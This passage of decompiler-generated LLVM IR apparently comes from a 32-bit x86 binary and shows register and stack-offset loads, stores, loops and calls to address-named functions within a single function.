  store i32 %v3_805565a, i32* %v6_805565a, align 4
  %v4_805565e = call i32 @function_8052724(i32 -1, i32 %v15_80553ac, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805565e, i32* @eax, align 4
  %v1_8055663 = load i32, i32* @esp, align 4
  %v2_8055663 = add i32 %v1_8055663, 32
  %v3_8055663 = inttoptr i32 %v2_8055663 to i32*
  store i32 %v4_805565e, i32* %v3_8055663, align 4
  %v0_8055667 = load i32, i32* @esp, align 4
  %v1_8055667 = add i32 %v0_8055667, 16
  %v7_805566d = icmp sgt i32 %v4_805565e, 11
  br i1 %v7_805566d, label %dec_label_pc_8055673, label %dec_label_pc_8055920

dec_label_pc_8055673:                             ; preds = %dec_label_pc_8055652
  %v0_8055673 = load i32, i32* @ebx, align 4
  %v2_8055673 = add i32 %v0_8055667, 12
  %v3_8055673 = inttoptr i32 %v2_8055673 to i32*
  store i32 %v0_8055673, i32* %v3_8055673, align 4
  %v0_8055674 = load i32, i32* @ebx, align 4
  %v2_8055674 = add i32 %v0_8055667, 8
  %v3_8055674 = inttoptr i32 %v2_8055674 to i32*
  store i32 %v0_8055674, i32* %v3_8055674, align 4
  %v1_8055675 = add i32 %v0_8055667, 84
  store i32 %v1_8055675, i32* %eax.global-to-local, align 4
  %v2_8055679 = add i32 %v0_8055667, 4
  %v3_8055679 = inttoptr i32 %v2_8055679 to i32*
  store i32 %v1_8055675, i32* %v3_8055679, align 4
  %v3_805567a = inttoptr i32 %v0_8055667 to i32*
  store i32 %v1_805531e, i32* %v3_805567a, align 4
  %v0_805567b = call i32 @function_8056cb8()
  store i32 %v0_805567b, i32* %eax.global-to-local, align 4
  %v0_8055680 = load i32, i32* @esp, align 4
  %v1_8055680 = add i32 %v0_8055680, 84
  %v2_8055680 = inttoptr i32 %v1_8055680 to i32*
  %v3_8055680 = load i32, i32* %v2_8055680, align 4
  store i32 %v3_8055680, i32* %edx.global-to-local, align 4
  %v2_8055684 = add i32 %v0_8055680, 60
  %v3_8055684 = inttoptr i32 %v2_8055684 to i32*
  store i32 %v3_8055680, i32* %v3_8055684, align 4
  %v0_8055688 = load i32, i32* @esp, align 4
  %v1_8055688 = add i32 %v0_8055688, 16
  %v1_805568b = add i32 %v0_8055688, 72
  %v2_805568b = inttoptr i32 %v1_805568b to i32*
  %v3_805568b = load i32, i32* %v2_805568b, align 4
  store i32 %v3_805568b, i32* @eax, align 4
  %v0_805568f = load i32, i32* %edx.global-to-local, align 4
  %v12_805568f = icmp eq i32 %v0_805568f, %v3_805568b
  %v1_8055691 = icmp eq i1 %v12_805568f, false
  br i1 %v1_8055691, label %dec_label_pc_8055920, label %dec_label_pc_8055697

dec_label_pc_8055697:                             ; preds = %dec_label_pc_8055673
  %v1_8055697 = add i32 %v0_8055688, 88
  %v2_8055697 = inttoptr i32 %v1_8055697 to i32*
  %v3_8055697 = load i32, i32* %v2_8055697, align 4
  %v4_8055697 = icmp eq i32 %v3_8055697, 0
  br i1 %v4_8055697, label %dec_label_pc_8055920, label %dec_label_pc_80556a2

dec_label_pc_80556a2:                             ; preds = %dec_label_pc_8055697
  %v1_80556a2 = add i32 %v0_8055688, 112
  %v2_80556a2 = inttoptr i32 %v1_80556a2 to i32*
  %v3_80556a2 = load i32, i32* %v2_80556a2, align 4
  store i32 %v3_80556a2, i32* @eax, align 4
  %v9_80556a6 = icmp eq i32 %v3_80556a2, 3
  %v1_80556a9 = icmp eq i1 %v9_80556a6, false
  br i1 %v1_80556a9, label %dec_label_pc_8055711, label %dec_label_pc_80556ab

dec_label_pc_80556ab:                             ; preds = %dec_label_pc_80556a2
  %v1_80556ab = add i32 %v0_8055688, 67
  %v2_80556ab = inttoptr i32 %v1_80556ab to i8*
  %v3_80556ab = load i8, i8* %v2_80556ab, align 1
  %v4_80556ab = icmp eq i8 %v3_80556ab, 0
  %v1_80556b0 = icmp eq i1 %v4_80556ab, false
  br i1 %v1_80556b0, label %dec_label_pc_8055701, label %dec_label_pc_80556b2

dec_label_pc_80556b2:                             ; preds = %dec_label_pc_80556ab
  %v0_80556b2 = load i32, i32* @ecx, align 4
  %v2_80556b2 = add i32 %v0_8055688, 12
  %v3_80556b2 = inttoptr i32 %v2_80556b2 to i32*
  store i32 %v0_80556b2, i32* %v3_80556b2, align 4
  %v1_80556b3 = add i32 %v0_8055688, 8
  %v2_80556b3 = inttoptr i32 %v1_80556b3 to i32*
  store i32 ptrtoint (i32* @global_var_805e888.337 to i32), i32* %v2_80556b3, align 4
  %v1_80556b8 = add i32 %v0_8055688, 4
  %v2_80556b8 = inttoptr i32 %v1_80556b8 to i32*
  store i32 134561879, i32* %v2_80556b8, align 4
  %v1_80556bd = add i32 %v0_8055688, 200
  store i32 %v1_80556bd, i32* @esi, align 4
  %v3_80556c4 = inttoptr i32 %v0_8055688 to i32*
  store i32 %v1_80556bd, i32* %v3_80556c4, align 4
  %v2_80556c5 = call i32 @function_805405a(i32 -1, i32 %v15_80553ac)
  store i32 %v2_80556c5, i32* %eax.global-to-local, align 4
  %v0_80556ca = load i32, i32* @esp, align 4
  %v1_80556ca = inttoptr i32 %v0_80556ca to i32*
  store i32 ptrtoint (i32* @global_var_805e888.337 to i32), i32* %v1_80556ca, align 4
  %v1_80556d1 = call i32 @function_8054057(i32 -1)
  store i32 %v1_80556d1, i32* %eax.global-to-local, align 4
  %v0_80556d6 = load i32, i32* @global_var_8064f78.402, align 8
  store i32 %v0_80556d6, i32* %ebx.global-to-local, align 4
  %v0_80556dc = load i32, i32* @esp, align 4
  %v1_80556dc = inttoptr i32 %v0_80556dc to i32*
  %v2_80556dc = load i32, i32* %v1_80556dc, align 4
  store i32 %v2_80556dc, i32* @eax, align 4
  %v3_80556dc = add i32 %v0_80556dc, 4
  %v1_80556dd = inttoptr i32 %v3_80556dc to i32*
  %v2_80556dd = load i32, i32* %v1_80556dd, align 4
  store i32 %v2_80556dd, i32* %edx.global-to-local, align 4
  %v1_80556de = add i32 %v0_80556d6, -1
  store i32 %v1_80556de, i32* @ebx, align 4
  store i32 1, i32* %v1_80556dd, align 4
  %v0_80556e1 = load i32, i32* @esi, align 4
  store i32 %v0_80556e1, i32* %v1_80556dc, align 4
  %v2_80556e2 = call i32 @function_805405a(i32 -1, i32 %v15_80553ac)
  store i32 %v2_80556e2, i32* %eax.global-to-local, align 4
  %v0_80556e7 = load i32, i32* @esp, align 4
  %v1_80556ea = add i32 %v0_80556e7, 52
  %v2_80556ea = inttoptr i32 %v1_80556ea to i32*
  %v3_80556ea = load i32, i32* %v2_80556ea, align 4
  %v4_80556ea = load i32, i32* @ebx, align 4
  %v5_80556ea = sub i32 %v3_80556ea, %v4_80556ea
  %v11_80556ea = xor i32 %v4_80556ea, %v3_80556ea
  %v12_80556ea = xor i32 %v5_80556ea, %v3_80556ea
  %v13_80556ea = and i32 %v12_80556ea, %v11_80556ea
  %v14_80556ea = icmp slt i32 %v13_80556ea, 0
  %v16_80556ea = icmp slt i32 %v5_80556ea, 0
  %v2_80556ee = icmp eq i1 %v16_80556ea, %v14_80556ea
  br i1 %v2_80556ee, label %dec_label_pc_8055701, label %dec_label_pc_80556f0

dec_label_pc_80556f0:                             ; preds = %dec_label_pc_80556b2
  %v1_80556f0 = add i32 %v0_80556e7, 60
  %v2_80556f0 = inttoptr i32 %v1_80556f0 to i32*
  %v3_80556f0 = load i32, i32* %v2_80556f0, align 4
  store i32 %v3_80556f0, i32* %edx.global-to-local, align 4
  %v3_80556f4 = load i32, i32* %v2_80556ea, align 4
  %v4_80556f4 = add i32 %v3_80556f4, 1
  store i32 %v4_80556f4, i32* %v2_80556ea, align 4
  %v0_80556f8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80556f8 = load i32, i32* @esp, align 4
  %v2_80556f8 = add i32 %v1_80556f8, 56
  %v3_80556f8 = inttoptr i32 %v2_80556f8 to i32*
  store i32 %v0_80556f8, i32* %v3_80556f8, align 4
  br label %dec_label_pc_805598c.backedge

dec_label_pc_8055701:                             ; preds = %dec_label_pc_80556b2, %dec_label_pc_80556ab
  %v0_8055701 = call i32 @function_8054608()
  store i32 %v0_8055701, i32* %eax.global-to-local, align 4
  %v1_8055706 = inttoptr i32 %v0_8055701 to i32*
  store i32 1, i32* %v1_8055706, align 4
  br label %dec_label_pc_80559c4

dec_label_pc_8055711:                             ; preds = %dec_label_pc_80556a2
  %v1_8055711 = icmp eq i32 %v3_80556a2, 0
  %v1_8055713 = icmp eq i1 %v1_8055711, false
  br i1 %v1_8055713, label %dec_label_pc_8055920, label %dec_label_pc_8055719

dec_label_pc_8055719:                             ; preds = %dec_label_pc_8055711
  %v1_8055719 = add i32 %v0_8055688, 120
  %v2_8055719 = inttoptr i32 %v1_8055719 to i32*
  %v3_8055719 = load i32, i32* %v2_8055719, align 4
  %tmp48 = icmp slt i32 %v3_8055719, 1
  br i1 %tmp48, label %dec_label_pc_8055729, label %dec_label_pc_8055720

dec_label_pc_8055720:                             ; preds = %dec_label_pc_8055719
  store i32 0, i32* @ebx, align 4
  store i32 12, i32* @esi, align 4
  %v2_805574854 = add i32 %v0_8055688, 116
  %v3_805574855 = inttoptr i32 %v2_805574854 to i32*
  %v4_805574856 = load i32, i32* %v3_805574855, align 4
  %v5_805574857 = sub i32 0, %v4_805574856
  %v13_805574860 = and i32 %v4_805574856, %v5_805574857
  %v14_805574861 = icmp slt i32 %v13_805574860, 0
  %v16_805574863 = icmp slt i32 %v5_805574857, 0
  %v2_805574c64 = icmp eq i1 %v16_805574863, %v14_805574861
  br i1 %v2_805574c64, label %dec_label_pc_805574e, label %dec_label_pc_8055739

dec_label_pc_8055729:                             ; preds = %dec_label_pc_8055719
  %v0_8055729 = call i32 @function_8054608()
  store i32 %v0_8055729, i32* %eax.global-to-local, align 4
  %v1_805572e = inttoptr i32 %v0_8055729 to i32*
  store i32 4, i32* %v1_805572e, align 4
  br label %dec_label_pc_80559c4

dec_label_pc_8055739:                             ; preds = %dec_label_pc_8055720, %dec_label_pc_8055739
  %v0_805575066 = phi i32 [ %v1_8055743, %dec_label_pc_8055739 ], [ %v1_8055688, %dec_label_pc_8055720 ]
  %v0_805573965 = phi i32 [ %v0_805573e, %dec_label_pc_8055739 ], [ %v3_80556a2, %dec_label_pc_8055720 ]
  %v2_8055739 = add i32 %v0_805575066, -4
  %v3_8055739 = inttoptr i32 %v2_8055739 to i32*
  store i32 %v0_805573965, i32* %v3_8055739, align 4
  %v0_805573a = load i32, i32* @ebx, align 4
  %v1_805573a = add i32 %v0_805573a, 1
  store i32 %v1_805573a, i32* @ebx, align 4
  %v0_805573b = load i32, i32* @eax, align 4
  %v2_805573b = add i32 %v0_805575066, -8
  %v3_805573b = inttoptr i32 %v2_805573b to i32*
  store i32 %v0_805573b, i32* %v3_805573b, align 4
  %v0_805573c = load i32, i32* @esi, align 4
  %v2_805573c = add i32 %v0_805575066, -12
  %v3_805573c = inttoptr i32 %v2_805573c to i32*
  store i32 %v0_805573c, i32* %v3_805573c, align 4
  %v2_805573d = add i32 %v0_805575066, -16
  %v3_805573d = inttoptr i32 %v2_805573d to i32*
  store i32 %v1_805531e, i32* %v3_805573d, align 4
  %v0_805573e = call i32 @function_8056db8()
  store i32 %v0_805573e, i32* @eax, align 4
  %v0_8055743 = load i32, i32* @esp, align 4
  %v1_8055743 = add i32 %v0_8055743, 16
  %v0_8055746 = load i32, i32* @esi, align 4
  %v2_8055746 = add i32 %v0_8055746, %v0_805573e
  %v0_8055748.pre = load i32, i32* @ebx, align 4
  store i32 %v2_8055746, i32* @esi, align 4
  %v2_8055748 = add i32 %v0_8055743, 116
  %v3_8055748 = inttoptr i32 %v2_8055748 to i32*
  %v4_8055748 = load i32, i32* %v3_8055748, align 4
  %v5_8055748 = sub i32 %v0_8055748.pre, %v4_8055748
  %v11_8055748 = xor i32 %v4_8055748, %v0_8055748.pre
  %v12_8055748 = xor i32 %v5_8055748, %v0_8055748.pre
  %v13_8055748 = and i32 %v12_8055748, %v11_8055748
  %v14_8055748 = icmp slt i32 %v13_8055748, 0
  %v16_8055748 = icmp slt i32 %v5_8055748, 0
  %v2_805574c = icmp eq i1 %v16_8055748, %v14_8055748
  br i1 %v2_805574c, label %dec_label_pc_805574e, label %dec_label_pc_8055739

dec_label_pc_805574e:                             ; preds = %dec_label_pc_8055739, %dec_label_pc_8055720
  %v0_8055750.lcssa = phi i32 [ %v1_8055688, %dec_label_pc_8055720 ], [ %v1_8055743, %dec_label_pc_8055739 ]
  store i32 0, i32* @ebx, align 4
  %v1_8055750 = add i32 %v0_8055750.lcssa, 27
  %v2_8055750 = inttoptr i32 %v1_8055750 to i8*
  store i8 1, i8* %v2_8055750, align 1
  %v0_805587e.pre = load i32, i32* @ebx, align 4
  %v1_805587e.pre = load i32, i32* @esp, align 4
  %v2_805587e67 = add i32 %v1_805587e.pre, 104
  %v3_805587e68 = inttoptr i32 %v2_805587e67 to i32*
  %v4_805587e69 = load i32, i32* %v3_805587e68, align 4
  %v5_805587e70 = sub i32 %v0_805587e.pre, %v4_805587e69
  %v11_805587e71 = xor i32 %v4_805587e69, %v0_805587e.pre
  %v12_805587e72 = xor i32 %v5_805587e70, %v0_805587e.pre
  %v13_805587e73 = and i32 %v12_805587e72, %v11_805587e71
  %v14_805587e74 = icmp slt i32 %v13_805587e73, 0
  %v16_805587e76 = icmp slt i32 %v5_805587e70, 0
  %v2_805588277 = icmp eq i1 %v16_805587e76, %v14_805587e74
  br i1 %v2_805588277, label %dec_label_pc_805588e, label %dec_label_pc_8055884.lr.ph

dec_label_pc_8055884.lr.ph:                       ; preds = %dec_label_pc_805574e
  %v0_8055884.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8055884

dec_label_pc_805575a:                             ; preds = %dec_label_pc_8055884
  %v1_805575a = add i32 %v0_805575a78, 116
  store i32 %v1_805575a, i32* %eax.global-to-local, align 4
  %v2_805575e = add i32 %v0_805575a78, -4
  %v3_805575e = inttoptr i32 %v2_805575e to i32*
  store i32 %v1_805575a, i32* %v3_805575e, align 4
  %v3_805575f = load i32, i32* %v3_8055884, align 4
  %v5_805575f = add i32 %v0_805575a78, -8
  %v6_805575f = inttoptr i32 %v5_805575f to i32*
  store i32 %v3_805575f, i32* %v6_805575f, align 4
  %v0_8055763 = load i32, i32* @esi, align 4
  %v2_8055763 = add i32 %v0_805575a78, -12
  %v3_8055763 = inttoptr i32 %v2_8055763 to i32*
  store i32 %v0_8055763, i32* %v3_8055763, align 4
  %v2_8055764 = add i32 %v0_805575a78, -16
  %v3_8055764 = inttoptr i32 %v2_8055764 to i32*
  store i32 %v1_805531e, i32* %v3_8055764, align 4
  %v0_8055765 = call i32 @function_8056dd4()
  store i32 %v0_8055765, i32* @eax, align 4
  %v1_805576a = load i32, i32* @esp, align 4
  %v2_805576a = add i32 %v1_805576a, 68
  %v3_805576a = inttoptr i32 %v2_805576a to i32*
  store i32 %v0_8055765, i32* %v3_805576a, align 4
  %v0_805576e = load i32, i32* @esp, align 4
  %v1_805576e = add i32 %v0_805576e, 16
  %v2_8055771 = icmp slt i32 %v0_8055765, 0
  %v1_8055773 = icmp eq i1 %v2_8055771, false
  br i1 %v1_8055773, label %dec_label_pc_805578d, label %dec_label_pc_8055775

dec_label_pc_8055775:                             ; preds = %dec_label_pc_805575a
  %v0_8055775 = load i32, i32* @ebx, align 4
  %v1_8055775 = icmp eq i32 %v0_8055775, 0
  br i1 %v1_8055775, label %dec_label_pc_8055920, label %dec_label_pc_805577d

dec_label_pc_805577d:                             ; preds = %dec_label_pc_8055775
  %v1_805577d = add i32 %v0_805576e, 100
  %v2_805577d = inttoptr i32 %v1_805577d to i32*
  %v3_805577d = load i32, i32* %v2_805577d, align 4
  %v4_805577d = icmp eq i32 %v3_805577d, 0
  br i1 %v4_805577d, label %dec_label_pc_8055920, label %dec_label_pc_805588e

dec_label_pc_805578d:                             ; preds = %dec_label_pc_805575a
  %v1_805578d = add i32 %v0_805576e, 43
  %v2_805578d = inttoptr i32 %v1_805578d to i8*
  %v3_805578d = load i8, i8* %v2_805578d, align 1
  %v4_805578d = icmp eq i8 %v3_805578d, 0
  br i1 %v4_805578d, label %dec_label_pc_805582e, label %dec_label_pc_8055798

dec_label_pc_8055798:                             ; preds = %dec_label_pc_805578d
  %v0_8055798 = load i32, i32* @edi, align 4
  %v1_8055798 = add i32 %v0_8055798, 28
  %v2_8055798 = inttoptr i32 %v1_8055798 to i32*
  %v3_8055798 = load i32, i32* %v2_8055798, align 4
  store i32 %v3_8055798, i32* %eax.global-to-local, align 4
  %v2_805579b = add i32 %v0_805576e, 160
  %v3_805579b = inttoptr i32 %v2_805579b to i32*
  store i32 %v3_8055798, i32* %v3_805579b, align 4
  %v0_80557a2 = load i32, i32* @edi, align 4
  %v1_80557a2 = add i32 %v0_80557a2, 32
  %v2_80557a2 = inttoptr i32 %v1_80557a2 to i32*
  %v3_80557a2 = load i32, i32* %v2_80557a2, align 4
  store i32 %v3_80557a2, i32* %eax.global-to-local, align 4
  %v1_80557a5 = load i32, i32* @esp, align 4
  %v2_80557a5 = add i32 %v1_80557a5, 148
  %v3_80557a5 = inttoptr i32 %v2_80557a5 to i32*
  store i32 %v3_80557a2, i32* %v3_80557a5, align 4
  %v0_80557ac = load i32, i32* @edi, align 4
  %v1_80557ac = add i32 %v0_80557ac, 36
  %v2_80557ac = inttoptr i32 %v1_80557ac to i32*
  %v3_80557ac = load i32, i32* %v2_80557ac, align 4
  store i32 %v3_80557ac, i32* %eax.global-to-local, align 4
  %v1_80557af = load i32, i32* @esp, align 4
  %v2_80557af = add i32 %v1_80557af, 152
  %v3_80557af = inttoptr i32 %v2_80557af to i32*
  store i32 %v3_80557ac, i32* %v3_80557af, align 4
  %v0_80557b6 = load i32, i32* @ecx, align 4
  %v1_80557b6 = load i32, i32* @esp, align 4
  %v2_80557b6 = add i32 %v1_80557b6, -4
  %v3_80557b6 = inttoptr i32 %v2_80557b6 to i32*
  store i32 %v0_80557b6, i32* %v3_80557b6, align 4
  %v1_80557b7 = add i32 %v1_80557b6, -8
  %v2_80557b7 = inttoptr i32 %v1_80557b7 to i32*
  store i32 40, i32* %v2_80557b7, align 4
  %v1_80557b9 = add i32 %v1_80557b6, 116
  store i32 %v1_80557b9, i32* %edx.global-to-local, align 4
  %v2_80557bd = add i32 %v1_80557b6, -12
  %v3_80557bd = inttoptr i32 %v2_80557bd to i32*
  store i32 %v1_80557b9, i32* %v3_80557bd, align 4
  %v0_80557be = load i32, i32* @edi, align 4
  %v2_80557be = add i32 %v1_80557b6, -16
  %v3_80557be = inttoptr i32 %v2_80557be to i32*
  store i32 %v0_80557be, i32* %v3_80557be, align 4
  %v4_80557bf = call i32 @function_8051e5c(i16* inttoptr (i32 -1 to i16*), i32 %v15_80553ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80557bf, i32* %eax.global-to-local, align 4
  %v0_80557c4 = load i32, i32* @edi, align 4
  %v1_80557c4 = add i32 %v0_80557c4, 4
  %v2_80557c4 = inttoptr i32 %v1_80557c4 to i32*
  %v3_80557c4 = load i32, i32* %v2_80557c4, align 4
  store i32 %v3_80557c4, i32* %eax.global-to-local, align 4
  %v0_80557c7 = load i32, i32* @esp, align 4
  %v1_80557c7 = add i32 %v0_80557c7, 16
  %v9_80557ca = icmp eq i32 %v3_80557c4, 24
  br i1 %v9_80557ca, label %dec_label_pc_8055798.dec_label_pc_80557f1_crit_edge, label %dec_label_pc_80557cf

dec_label_pc_8055798.dec_label_pc_80557f1_crit_edge: ; preds = %dec_label_pc_8055798
  %.pre24 = add i32 %v0_80557c7, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_80557f1.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_80557f1

dec_label_pc_80557cf:                             ; preds = %dec_label_pc_8055798
  %v1_80557cf = add i32 %v0_80557c4, 28
  %v2_80557cf = inttoptr i32 %v1_80557cf to i32*
  %v3_80557cf = load i32, i32* %v2_80557cf, align 4
  %v4_80557cf = icmp eq i32 %v3_80557cf, 0
  br i1 %v4_80557cf, label %dec_label_pc_805588e, label %dec_label_pc_80557d9

dec_label_pc_80557d9:                             ; preds = %dec_label_pc_80557cf
  %v1_80557d9 = add i32 %v0_80557c7, 260
  %v2_80557d9 = inttoptr i32 %v1_80557d9 to i32*
  %v3_80557d9 = load i32, i32* %v2_80557d9, align 4
  %v12_80557d9 = icmp eq i32 %v3_80557d9, 1
  br i1 %v12_80557d9, label %dec_label_pc_80557f1, label %dec_label_pc_80557e3

dec_label_pc_80557e3:                             ; preds = %dec_label_pc_80557d9
  %v12_80557e3 = icmp eq i32 %v3_80557d9, 28
  %v1_80557eb = icmp eq i1 %v12_80557e3, false
  br i1 %v1_80557eb, label %dec_label_pc_805588e, label %dec_label_pc_80557f1

dec_label_pc_80557f1:                             ; preds = %dec_label_pc_8055798.dec_label_pc_80557f1_crit_edge, %dec_label_pc_80557e3, %dec_label_pc_80557d9
  %v4_80557f1 = phi i32 [ %v4_80557f1.pre, %dec_label_pc_8055798.dec_label_pc_80557f1_crit_edge ], [ %v3_80557d9, %dec_label_pc_80557e3 ], [ %v3_80557d9, %dec_label_pc_80557d9 ]
  %v15_80557f1 = icmp eq i32 %v3_80557c4, %v4_80557f1
  br i1 %v15_80557f1, label %dec_label_pc_8055806, label %dec_label_pc_80557fa

dec_label_pc_80557fa:                             ; preds = %dec_label_pc_80557f1
  %v1_80557fd = inttoptr i32 %v0_80557c4 to i32*
  %v2_80557fd = load i32, i32* %v1_80557fd, align 4
  %v5_80557fd = inttoptr i32 %v0_80557c7 to i32*
  store i32 %v2_80557fd, i32* %v5_80557fd, align 4
  %v1_80557ff = call i32 @function_8053391(i32 -1)
  store i32 %v1_80557ff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055876

dec_label_pc_8055806:                             ; preds = %dec_label_pc_80557f1
  %v0_8055806 = load i32, i32* @ebx, align 4
  %v1_8055808 = sub i32 -1, %v0_8055806
  store i32 %v1_8055808, i32* %eax.global-to-local, align 4
  %v2_805580a = add i32 %v0_80557c7, 120
  %v3_805580a = inttoptr i32 %v2_805580a to i32*
  %v4_805580a = load i32, i32* %v3_805580a, align 4
  %v5_805580a = add i32 %v4_805580a, %v1_8055808
  store i32 %v5_805580a, i32* %eax.global-to-local, align 4
  %v2_805580e = add i32 %v0_80557c4, 36
  %v3_805580e = inttoptr i32 %v2_805580e to i32*
  store i32 %v5_805580a, i32* %v3_805580e, align 4
  %v0_8055811 = load i32, i32* @edi, align 4
  %v1_8055811 = add i32 %v0_8055811, 16
  %v2_8055811 = inttoptr i32 %v1_8055811 to i32*
  %v3_8055811 = load i32, i32* %v2_8055811, align 4
  %v1_8055814 = add i32 %v3_8055811, 4
  store i32 %v1_8055814, i32* %eax.global-to-local, align 4
  %v2_8055817 = add i32 %v0_8055811, 36
  %v3_8055817 = inttoptr i32 %v2_8055817 to i32*
  %v4_8055817 = load i32, i32* %v3_8055817, align 4
  %v7_8055817 = mul i32 %v4_8055817, %v1_8055814
  store i32 %v7_8055817, i32* %eax.global-to-local, align 4
  %v2_805581b = add i32 %v0_8055811, 32
  %v3_805581b = inttoptr i32 %v2_805581b to i32*
  %v4_805581b = load i32, i32* %v3_805581b, align 4
  %v6_805581e = icmp ugt i32 %v7_8055817, %v4_805581b
  br i1 %v6_805581e, label %dec_label_pc_8055806.dec_label_pc_805588e.loopexit_crit_edge, label %dec_label_pc_8055820

dec_label_pc_8055806.dec_label_pc_805588e.loopexit_crit_edge: ; preds = %dec_label_pc_8055806
  %v0_805588e.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805588e

dec_label_pc_8055820:                             ; preds = %dec_label_pc_8055806
  store i32 0, i32* %v3_8055817, align 4
  %v0_8055827 = load i32, i32* @esp, align 4
  %v1_8055827 = add i32 %v0_8055827, 27
  %v2_8055827 = inttoptr i32 %v1_8055827 to i8*
  store i8 0, i8* %v2_8055827, align 1
  %v1_8055879.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055879

dec_label_pc_805582e:                             ; preds = %dec_label_pc_805578d
  %v1_8055831 = add i32 %v0_805576e, 132
  %v2_8055831 = inttoptr i32 %v1_8055831 to i32*
  %v3_8055831 = load i32, i32* %v2_8055831, align 4
  %v6_8055831 = inttoptr i32 %v0_805576e to i32*
  store i32 %v3_8055831, i32* %v6_8055831, align 4
  %v1_8055838 = call i32 @function_8053391(i32 -1)
  store i32 %v1_8055838, i32* %eax.global-to-local, align 4
  %v0_805583d = load i32, i32* @esp, align 4
  %v1_805583d = add i32 %v0_805583d, 16
  %v1_8055840 = add i32 %v0_805583d, 260
  %v2_8055840 = inttoptr i32 %v1_8055840 to i32*
  %v3_8055840 = load i32, i32* %v2_8055840, align 4
  store i32 %v3_8055840, i32* %eax.global-to-local, align 4
  %v1_8055847 = add i32 %v0_805583d, 136
  %v2_8055847 = inttoptr i32 %v1_8055847 to i32*
  %v3_8055847 = load i32, i32* %v2_8055847, align 4
  %v15_8055847 = icmp eq i32 %v3_8055847, %v3_8055840
  %v1_805584b = icmp eq i1 %v15_8055847, false
  br i1 %v1_805584b, label %dec_label_pc_8055879, label %dec_label_pc_805584d

dec_label_pc_805584d:                             ; preds = %dec_label_pc_805582e
  %v0_805584d = load i32, i32* @edi, align 4
  %v1_805584d = add i32 %v0_805584d, 16
  %v2_805584d = inttoptr i32 %v1_805584d to i32*
  %v3_805584d = load i32, i32* %v2_805584d, align 4
  store i32 %v3_805584d, i32* %eax.global-to-local, align 4
  %v2_8055850 = add i32 %v0_805583d, 148
  %v3_8055850 = inttoptr i32 %v2_8055850 to i32*
  %v4_8055850 = load i32, i32* %v3_8055850, align 4
  %v15_8055850 = icmp eq i32 %v3_805584d, %v4_8055850
  %v1_8055857 = icmp eq i1 %v15_8055850, false
  br i1 %v1_8055857, label %dec_label_pc_8055913, label %dec_label_pc_805585d

dec_label_pc_805585d:                             ; preds = %dec_label_pc_805584d
  %v0_805585d = load i32, i32* @edx, align 4
  %v2_805585d = add i32 %v0_805583d, 12
  %v3_805585d = inttoptr i32 %v2_805585d to i32*
  store i32 %v0_805585d, i32* %v3_805585d, align 4
  %v0_805585e = load i32, i32* %eax.global-to-local, align 4
  %v2_805585e = add i32 %v0_805583d, 8
  %v3_805585e = inttoptr i32 %v2_805585e to i32*
  store i32 %v0_805585e, i32* %v3_805585e, align 4
  %v1_805585f = add i32 %v0_805583d, 152
  %v2_805585f = inttoptr i32 %v1_805585f to i32*
  %v3_805585f = load i32, i32* %v2_805585f, align 4
  %v5_805585f = add i32 %v0_805583d, 4
  %v6_805585f = inttoptr i32 %v5_805585f to i32*
  store i32 %v3_805585f, i32* %v6_805585f, align 4
  %v0_8055866 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055866 = load i32, i32* @edi, align 4
  %v2_8055866 = add i32 %v1_8055866, 36
  %v3_8055866 = inttoptr i32 %v2_8055866 to i32*
  %v4_8055866 = load i32, i32* %v3_8055866, align 4
  %v7_8055866 = mul i32 %v4_8055866, %v0_8055866
  store i32 %v7_8055866, i32* %eax.global-to-local, align 4
  %v2_805586a = add i32 %v1_8055866, 28
  %v3_805586a = inttoptr i32 %v2_805586a to i32*
  %v4_805586a = load i32, i32* %v3_805586a, align 4
  %v5_805586a = add i32 %v4_805586a, %v7_8055866
  store i32 %v5_805586a, i32* %eax.global-to-local, align 4
  %v3_805586d = inttoptr i32 %v0_805583d to i32*
  store i32 %v5_805586a, i32* %v3_805586d, align 4
  %v4_805586e = call i32 @function_8051e5c(i16* inttoptr (i32 -1 to i16*), i32 %v15_80553ac, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805586e, i32* %eax.global-to-local, align 4
  %v0_8055873 = load i32, i32* @edi, align 4
  %v1_8055873 = add i32 %v0_8055873, 36
  %v2_8055873 = inttoptr i32 %v1_8055873 to i32*
  %v3_8055873 = load i32, i32* %v2_8055873, align 4
  %v4_8055873 = add i32 %v3_8055873, 1
  store i32 %v4_8055873, i32* %v2_8055873, align 4
  br label %dec_label_pc_8055876

dec_label_pc_8055876:                             ; preds = %dec_label_pc_80557fa, %dec_label_pc_805585d
  %v0_8055876 = load i32, i32* @esp, align 4
  %v1_8055876 = add i32 %v0_8055876, 16
  br label %dec_label_pc_8055879

dec_label_pc_8055879:                             ; preds = %dec_label_pc_805582e, %dec_label_pc_8055820, %dec_label_pc_8055876
  %v1_8055879 = phi i32 [ %v1_805583d, %dec_label_pc_805582e ], [ %v1_8055879.pre, %dec_label_pc_8055820 ], [ %v1_8055876, %dec_label_pc_8055876 ]
  %v0_8055879 = load i32, i32* @esi, align 4
  %v2_8055879 = add i32 %v1_8055879, 52
  %v3_8055879 = inttoptr i32 %v2_8055879 to i32*
  %v4_8055879 = load i32, i32* %v3_8055879, align 4
  %v5_8055879 = add i32 %v4_8055879, %v0_8055879
  store i32 %v5_8055879, i32* @esi, align 4
  %v0_805587d = load i32, i32* @ebx, align 4
  %v1_805587d = add i32 %v0_805587d, 1
  store i32 %v1_805587d, i32* @ebx, align 4
  %v2_805587e = add i32 %v1_8055879, 104
  %v3_805587e = inttoptr i32 %v2_805587e to i32*
  %v4_805587e = load i32, i32* %v3_805587e, align 4
  %v5_805587e = sub i32 %v1_805587d, %v4_805587e
  %v11_805587e = xor i32 %v4_805587e, %v1_805587d
  %v12_805587e = xor i32 %v5_805587e, %v1_805587d
  %v13_805587e = and i32 %v12_805587e, %v11_805587e
  %v14_805587e = icmp slt i32 %v13_805587e, 0
  %v16_805587e = icmp slt i32 %v5_805587e, 0
  %v2_8055882 = icmp eq i1 %v16_805587e, %v14_805587e
